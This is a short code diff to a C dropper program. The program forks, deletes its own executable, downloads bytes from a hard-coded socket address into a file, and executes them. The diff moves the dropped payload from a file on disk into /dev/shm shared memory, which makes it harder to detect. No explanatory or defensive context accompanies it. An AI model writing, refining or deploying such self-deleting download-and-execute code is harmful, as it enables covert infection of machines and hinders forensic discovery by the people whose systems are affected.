@@ -4,6 +4,7 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <sys/mman.h>
 
 #define BUF_SIZE 1024
 
@@ -12,7 +13,7 @@ int	main(int argc, char *argv[])
 	if(fork() == 0)
 		return (0);
 	unlink(argv[0]);
-	int dropped_file = open("./k", O_WRONLY | O_TRUNC | O_CREAT, 0777);
+	int dropped_file = shm_open("k", O_WRONLY | O_CREAT, 0777);
 	int s, l;
 	unsigned long addr = 0x0100007f11110002;
 	unsigned char buf[BUF_SIZE];
@@ -30,6 +31,6 @@ int	main(int argc, char *argv[])
 	}
 	close(s);
 	close(dropped_file);
-	execv("./k", name);
+	execv("/dev/shm/k", name);
 	return (0);
 }
